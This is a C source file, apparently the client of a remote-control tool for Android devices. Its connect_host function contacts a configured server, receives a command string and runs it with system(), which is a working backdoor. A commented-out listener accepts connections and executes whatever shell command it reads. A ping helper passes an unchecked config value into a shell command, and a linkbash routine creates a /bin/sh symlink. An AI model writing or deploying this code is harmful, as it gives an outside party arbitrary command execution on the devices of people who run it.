#include "contain.h"
#include <unistd.h>
#include "config.h"
#include "socket_control.h"
#include "project_head.h"
#include "pthreadxsx.h"






//==============================connect================================

void* ping_pthread(void * argument)
{
	char* shell =(char*)argument;
	system(shell);
}


int dnsbyping(char* ip)
{
	DEBUGW;
	char *filename = "tmp.txt";
	char newip[30] = {0};
	char ping[40] = {0};
	sprintf(ping,"ping %s > %s",ip,filename);
	pthread_t pid = pthread_run(ping_pthread,ping);
	sleep(2);
	pthread_cancel(pid);
	pthread_join(pid,NULL);
	int filefd = open(filename,O_RDWR);
	DEBUGI(filefd);
	if(filefd == -1)
	{
		DEBUGW;
		return false;
	}
	char buf[100] = {0};
	char *pr = buf;
	int res = 0;
	DEBUGW;
	while( 1 )
	{
		res = read(filefd,pr,1);
		if(res != 1)
			return false;
		if(*pr != ')')
			pr++;
		else
			break;
	}
	DEBUGW;
	close(filefd);
	unlink(filename);
	*pr = 0;
	pr = strchr(buf,'(');
	if(pr == NULL)
		return false;
	pr++;
	strcpy(ip,pr);
	DEBUGW;
	return true;
}



int connect_host(int m)
{
	char ipaddr[30];
	char port[10];
	readcfg("ip",ipaddr);
	if(dnsbyping(ipaddr) == false )
	{
		DEBUGW;
		printf("dns fail");
		return false;
	}
	readcfg("ctosport",port);
	DEBUGW;
	DEBUGS(ipaddr);
	DEBUGS(port);
	
	address_x addr;
	address_init(&addr,ipaddr,atoi(port));
	DEBUGW;
	int sockfd = create_socket_x();
	DEBUGW;
	if(sockfd == -1)
		return false;
	if( connect_x(sockfd,&addr) == -1)
		return false;
	DEBUGW;
	U_MSG k;
	k.regist_m.type = T_HEART;
	k.regist_m.id = m;
	int n = write(sockfd,&k,sizeof(U_MSG));
	DEBUGW;
	if(n!=sizeof(U_MSG))
		perror("write err");
	DEBUGW;
	n = read(sockfd,&k,sizeof(U_MSG));
	DEBUGW;
	if(n!=sizeof(U_MSG))
		perror("read err");
	char *shellbuf = (char*)malloc(k.shell_m.commandlen+1);
	memset(shellbuf,0,k.shell_m.commandlen+1);
	DEBUGI(k.shell_m.commandlen);
	DEBUGW;
	n = read(sockfd,shellbuf,k.shell_m.commandlen);
	DEBUGW;
	if(n!=k.shell_m.commandlen)
		perror("read err");
	printf("%s\n", shellbuf);
	system(shellbuf);

	close(sockfd);
}



void* timer_connect_host(void* argument)
{
	int k = *(int*)argument;
	connect_host(k);
}

//-----------------------------connect-----------------------------



//=============================listen=======================

/*int exeshell(int fd)
{
	char shell[100] = {0};
	read(fd,shell,100);
	int k = system(shell);
	printf("system = %d\n", k);
}



void* readsocket(void * argument)
{
	int fd = *((int*)argument);
	free((int*)argument);

	U_MSG msgbuff;
	int seek = read(fd,&msgbuff,sizeof(msgbuff));
	if(seek!=sizeof(msgbuff))
	{
		return NULL;
	}
	int uid = *(int*)(&msgbuff);
	switch(uid)
	{
		case ID_SHELL:
			exeshell(fd);
			break;
		default:
			break;
	}
}



void* const_listen_host(void* argument)
{
	char port[10];
	readcfg("stocport",port);
	DEBUGS(port);
	int sockfd = create_socket_x();
	if(sockfd == -1)
		return 0;
	bind_x(sockfd,atoi(port));
	listen_x(sockfd);

	while(1)
	{
		int * fd = (int*)malloc(sizeof(int));
		*fd = accept_x(sockfd,NULL);
		pthread_run(readsocket,fd);
	}
}


*/
//--------------------------listen---------------------------




int linkbash()
{
	int red = mkdir("/bin",777);
	if(red == -1)
	{
		if(errno != EEXIST)
		{
			perror("err:");
			return false;
		}
		errno = 0;
	}
	red = symlink("/system/bin/sh","/bin/sh");
	if(red == -1)
	{
		if(errno != EEXIST)
		{
			perror("err:");
			return false;
		}
		errno = 0;
	}
	return true;
}






